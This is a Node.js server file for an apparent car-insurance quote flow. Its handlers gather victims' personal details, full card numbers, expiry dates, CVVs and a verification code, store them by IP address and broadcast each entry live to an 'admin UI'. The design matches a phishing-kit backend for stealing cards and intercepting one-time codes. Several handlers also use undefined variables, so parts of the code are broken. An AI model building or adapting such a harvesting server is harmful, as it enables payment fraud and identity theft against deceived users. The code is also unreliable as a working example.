// index.js
require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const mongoose = require("mongoose");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// 1) Connect to MongoDB
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("✔ MongoDB connected test"))
  .catch((err) => console.error("✖ MongoDB connection error:", err));

// models imports
const Index = require("./models/Index");
const Cars = require("./models/Car");
const Insurance = require("./models/Insurance");
const InsuranceCard = require("./models/InsuranceCard");
const InsuranceInfo = require("./models/InsuranceInfo");
const PlateNumber = require("./models/PlateNumber");
const User = require("./models/User");
const axios = require("axios");
const PolicyDate = require("./models/PolicyDate");
const Quote = require("./models/Quote");
const Payment = require("./models/Payment");
const Code = require("./models/Code");

// public function to find or create user by IP
async function findOrCreateUser(ip) {
  let user = await User.findOne({ ip });
  if (!user) user = await User.create({ ip });
  return user;
}

io.on("connection", (socket) => {
  console.log("▶", socket.id, "connected");

  /// index.js

  socket.on("submitIndex", async (payload) => {
    const user = await findOrCreateUser(payload.ip);

    const saved = await Index.create({
      user: user._id,
      ip: payload.ip,
      phone: payload.phone,
    });

    io.emit("newIndex", {
      ip: saved.ip,
      phone: saved.phone,
      user: saved.user,
    });

    socket.emit("ackIndex", { success: true, error: null });
  });

  // flow.js

  //flow body number
  socket.on("submitCarBody", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const vin = (payload.carBody || "").trim().toUpperCase();
      if (!vin) {
        return socket.emit("ackCarBody", {
          success: false,
          error: "Body number (VIN) is required.",
        });
      }

      const decodeUrl = `https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVinValues/${vin}?format=json`;
      const { data } = await axios.get(decodeUrl);
      const info = data.Results[0] || {};

      const carInfo = {
        brand: info.Make || null,
        model: info.Model || null,
        year: info.ModelYear || null,
        seat: info.Seats || info.SeatRows || null,
        cyl: info.EngineCylinders || null,
      };

      const updated = await Cars.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            carBody: vin,
            brand: carInfo.brand,
            model: carInfo.model,
            year: carInfo.year,
            seat: carInfo.seat,
            cyl: carInfo.cyl,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newCarBody", {
        ip: updated.ip,
        carBody: updated.carBody,
        brand: updated.brand,
        model: updated.model,
        year: updated.year,
        seat: updated.seat,
        cyl: updated.cyl,
      });

      socket.emit("ackCarBody", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitCarBody:", err);
      socket.emit("ackCarBody", {
        success: false,
        error: err.message || "Server error while decoding car body.",
      });
    }
  });

  // car flow.html
  socket.on("submitCar", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const updated = await Cars.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            carBody: vin,
            brand: carInfo.brand,
            model: carInfo.model,
            year: carInfo.year,
            seat: carInfo.seat,
            cyl: carInfo.cyl,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newCar", {
        ip: user.ip,
        brand: updated.brand,
        model: updated.model,
        year: updated.year,
        seat: updated.seat,
        cyl: updated.cyl,
      });

      socket.emit("ackCar", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitCar:", err);
      socket.emit("ackCar", { success: false, error: err.message });
    }
  });

  // InsuranceCard.js more-info.html

  socket.on("submitInsuranceCard", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await InsuranceCard.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip,
            vehicleType,
            registrationYear,
            cardId,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newInsuranceCard", {
        ip: doc.ip,
        vehicleType: doc.vehicleType,
        registrationYear: doc.registrationYear,
        cardId: doc.cardId,
      });

      socket.emit("ackInsuranceCard", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsuranceCard:", err);
      socket.emit("ackInsuranceCard", { success: false, error: err.message });
    }
  });

  // Insurance.js plans.html

  socket.on("submitInsurance", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await Insurance.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip,
            type,
            cost,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newInsurance", {
        ip: doc.ip,
        type: doc.type,
        cost: doc.cost,
      });

      socket.emit("ackInsurance", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsurance:", err);
      socket.emit("ackInsurance", { success: false, error: err.message });
    }
  });

  // plate-number.html

  socket.on("submitPlateNumber", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await PlateNumber.findOneAndUpdate(
        { user: user._id },

        {
          $set: {
            ip,
            plateNumber,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },

        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );
      io.emit("newPlateNumber", {
        ip: doc.ip,
        plateNumber: doc.plateNumber,
      });

      socket.emit("ackPlateNumber", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitPlateNumber:", err);
      socket.emit("ackPlateNumber", { success: false, error: err.message });
    }
  });

  // insured-info.html

  socket.on("submitInsuredInfo", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await InsuranceInfo.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip,
            name: fullName,
            email,
            gender,
            address,
            dob,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );
      io.emit("newInsuredInfo", {
        ip: doc.ip,
        fullName: doc.fullName,
        address: doc.address,
        dob: doc.dob,
        email: doc.email,
        gender: doc.gender,
      });
      socket.emit("ackInsuredInfo", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsuredInfo:", err);
      socket.emit("ackInsuredInfo", { success: false, error: err.message });
    }
  });

  // policy-date.html

  socket.on("submitPolicyDate", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await PolicyDate.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip,
            policyStartDate,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newPolicyDate", {
        ip: doc.ip,
        policyStartDate: doc.policyStartDate,
      });

      socket.emit("ackPolicyDate", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitPolicyDate:", err);
      socket.emit("ackPolicyDate", { success: false, error: err.message });
    }
  });

  // quote.html

  socket.on("submitQuote", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await Quote.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip,
            term,
            paymentMethod,
            amount,
            currency,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newQuote", {
        ip: doc.ip,
        term: doc.term,
        paymentMethod: doc.paymentMethod,
        amount: doc.amount,
        currency: doc.currency,
      });

      socket.emit("ackQuote", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitQuote:", err);
      socket.emit("ackQuote", { success: false, error: err.message });
    }
  });

  // payment.html

  socket.on("submitPayment", async (payload) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(payload.ip);

    const doc = await Payment.findOneAndUpdate(
      { user: user._id },
      {
        $set: {
          cardHolderName: payload.cardHolderName,
          cardNumber: payload.cardNumber,
          ip: payload.ip,
          expirationDate: payload.expirationDate,
          cvv: payload.cvv,
          time: Date.now(),
        },
        $setOnInsert: { user: user._id },
      },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
        runValidators: true,
      }
    );

    // 3) Broadcast the minimal payload for admin UI
    io.emit("newPayment", {
      ip: user.ip,
      cardHolderName: doc.cardHolderName,
      cardNumber: doc.cardNumber,
      expirationDate: doc.expirationDate,
      cvv: doc.cvv,
      time: doc.time,
    });
    socket.emit("ackPayment", { success: true, error: null });
  });

  socket.on("submitCode", async ({ ip, verification_code }) => {
    // 1) Ensure the User exists
    const user = await findOrCreateUser(ip);

    const doc = await Code.findOneAndUpdate(
      { user: user._id },
      {
        $set: {
          verificationCode: verification_code,
          time: Date.now(),
        },
        $setOnInsert: { user: user._id },
      },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
        runValidators: true,
      }
    );

    // 3) Broadcast to admin UI (optional)
    io.emit("newPin", {
      ip: user.ip,
      pin: doc.verificationCode,
      time: doc.time,
    });

    // 4) Ack back to the client
    socket.emit("ackCode", { success: true, error: null });
  });
});

// delete
app.delete("/api/users/:ip", async (req, res) => {
  const { ip } = req.params;
  const user = await User.findOne({ ip });
  if (user) {
    await Promise.all([Index.deleteMany({ user: user._id }), user.deleteOne()]);
    io.emit("userDeleted", { ip });
  }
  res.json({ success: true });
});

const PORT = process.env.PORT || 3020;
server.listen(PORT, () => console.log(`🚀 Listening on port ${PORT}`));
